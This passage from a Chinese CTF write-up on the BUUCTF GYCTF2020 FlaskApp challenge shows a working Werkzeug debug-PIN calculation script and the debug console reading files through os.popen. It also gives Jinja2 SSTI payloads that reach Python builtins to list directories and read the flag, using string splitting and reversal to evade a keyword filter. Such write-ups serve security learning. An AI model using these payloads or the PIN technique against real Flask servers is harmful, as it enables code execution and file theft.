+ok ，然后就用大佬的脚本<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span><span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;116666561328231&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;1408f836b0ca514d796cbf8960e45fa1&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+得到288-246-349，在报错的处的末端输入即可拿到flag<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[console ready]</span><br><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; os.popen(<span class="string">&#x27;ls /&#x27;</span>).<span class="built_in">read</span>()</span><br><span class="line"><span class="string">&#x27;app\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\nthis_is_the_flag.txt\ntmp\nusr\nvar\n&#x27;</span>  </span><br><span class="line">&gt;&gt;&gt; os.popen(<span class="string">&#x27;cat /*flag.txt&#x27;</span>).<span class="built_in">read</span>()</span><br><span class="line"><span class="string">&#x27;flag&#123;5cbc02c5-3778-40eb-a102-46edc979f6f0&#125;\n&#x27;</span></span><br><span class="line">&gt;&gt;&gt; </span><br></pre></td></tr></table></figure>
+<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3>读取目录<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__imp&#x27;</span>+<span class="string">&#x27;ort__&#x27;</span>](<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>).listdir(<span class="string">&#x27;/&#x27;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">得到的是HTML实体编码，再用浏览器解析即可</span><br><span class="line"><span class="string">&#x27;bin&#x27;</span>, <span class="string">&#x27;boot&#x27;</span>, <span class="string">&#x27;dev&#x27;</span>, <span class="string">&#x27;etc&#x27;</span>, <span class="string">&#x27;home&#x27;</span>, <span class="string">&#x27;lib&#x27;</span>, <span class="string">&#x27;lib64&#x27;</span>, <span class="string">&#x27;media&#x27;</span>, <span class="string">&#x27;mnt&#x27;</span>, <span class="string">&#x27;opt&#x27;</span>, <span class="string">&#x27;proc&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;run&#x27;</span>, <span class="string">&#x27;sbin&#x27;</span>, <span class="string">&#x27;srv&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;tmp&#x27;</span>, <span class="string">&#x27;usr&#x27;</span>, <span class="string">&#x27;var&#x27;</span>, <span class="string">&#x27;this_is_the_flag.txt&#x27;</span>,</span><br></pre></td></tr></table></figure>
+由于过滤了flag，采用拼接的方法<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">分割</span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/this_is_the_fl&#x27;</span>+<span class="string">&#x27;ag.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">或者反转</span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;txt.galf_eht_si_siht/&#x27;</span>[::-<span class="number">1</span>],<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">最后的到flag</span><br><span class="line"></span><br><span class="line">flag&#123;5cbc02c5-<span class="number">3778</span>-40eb-a102-46edc979f6f0&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><a target="_blank" rel="noopener" href="https://blog.csdn.net/SopRomeo/article/details/105875248">https://blog.csdn.net/SopRomeo/article/details/105875248</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43610673/article/details/104726642">https://blog.csdn.net/weixin_43610673/article/details/104726642</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/32336971">Flask debug 模式 PIN 码生成机制安全性研究笔记</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/32138231">Flask开启debug模式等于给黑客留了后门</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_54648419/article/details/123632203">Flask debug模式算pin码</a></li>
+</ol>
+
+  </div>
+</article>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/tags/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">漏洞点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">背景知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFflask%E7%9A%84debug%E6%A8%A1%E5%BC%8F-pin%E7%A0%81%EF%BC%9F"><span class="toc-number">2.1.</span> <span class="toc-text">什么是flask的debug模式\pin码？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%951"><span class="toc-number">3.1.</span> <span class="toc-text">方法1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%952"><span class="toc-number">3.2.</span> <span class="toc-text">方法2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/04/25/BUUCTF-WEB-GYCTF2020-FlaskApp-ssti/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/04/25/BUUCTF-WEB-GYCTF2020-FlaskApp-ssti/&text=BUUCTF-WEB-[GYCTF2020]FlaskApp-ssti"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/04/25/BUUCTF-WEB-GYCTF2020-FlaskApp-ssti/&title=BUUCTF-WEB-[GYCTF2020]FlaskApp-ssti"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/04/25/BUUCTF-WEB-GYCTF2020-FlaskApp-ssti/&is_video=false&description=BUUCTF-WEB-[GYCTF2020]FlaskApp-ssti"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF-WEB-[GYCTF2020]FlaskApp-ssti&body=Check out this article: http://example.com/2022/04/25/BUUCTF-WEB-GYCTF2020-FlaskApp-ssti/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/04/25/BUUCTF-WEB-GYCTF2020-FlaskApp-ssti/&title=BUUCTF-WEB-[GYCTF2020]FlaskApp-ssti"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/04/25/BUUCTF-WEB-GYCTF2020-FlaskApp-ssti/&title=BUUCTF-WEB-[GYCTF2020]FlaskApp-ssti"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/04/25/BUUCTF-WEB-GYCTF2020-FlaskApp-ssti/&title=BUUCTF-WEB-[GYCTF2020]FlaskApp-ssti"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/04/25/BUUCTF-WEB-GYCTF2020-FlaskApp-ssti/&title=BUUCTF-WEB-[GYCTF2020]FlaskApp-ssti"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/04/25/BUUCTF-WEB-GYCTF2020-FlaskApp-ssti/&name=BUUCTF-WEB-[GYCTF2020]FlaskApp-ssti&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/04/25/BUUCTF-WEB-GYCTF2020-FlaskApp-ssti/&t=BUUCTF-WEB-[GYCTF2020]FlaskApp-ssti"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    Imp1ture
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/tags/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
